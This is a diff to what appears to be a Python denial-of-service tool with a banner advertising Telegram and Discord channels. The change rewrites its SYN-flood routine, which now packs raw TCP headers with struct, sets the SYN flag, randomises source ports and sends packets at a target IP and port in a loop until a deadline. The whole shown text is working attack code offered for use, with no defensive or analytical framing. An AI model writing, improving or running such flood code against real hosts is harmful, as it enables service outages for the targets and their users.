@@ -4,6 +4,7 @@ import datetime
 import threading
 import time
 import os
+import struct
 from scapy.all import IP, TCP, raw
 import random
 
@@ -104,11 +105,11 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
 
             def syn(ip, port, until_datetime):
                 while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+                    flags = 0b00000010
                     try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-                        payloads = IP(dst=ip)/TCP(dport=port, flags="S", seq=random.randint(1000, 9000))
-                        sock.sendto(raw(payloads), (ip, 0))
-                        sock.close()
+                        src_port = random.randint(1024, 65535)
+                        pkt = struct.pack('!HHIIBBHHH', src_port, port, 0, 0, 80, flags, 8192, 0, 0)
+                        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP).sendto(pkt, (ip, 0))
                     except:
                         pass
 
@@ -140,6 +141,7 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
 
 if __name__ == "__main__":
     layer4()
+
 
 
 
